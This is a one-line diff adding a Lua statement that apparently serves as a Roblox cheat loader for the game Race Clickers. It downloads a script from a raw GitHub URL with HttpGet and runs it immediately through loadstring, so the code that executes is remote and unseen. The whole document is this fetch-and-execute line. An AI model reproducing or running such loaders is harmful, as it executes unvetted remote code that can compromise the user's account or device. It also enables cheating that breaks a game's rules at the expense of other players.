@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DEV-TK02/Games/main/RaceClickers', true))()
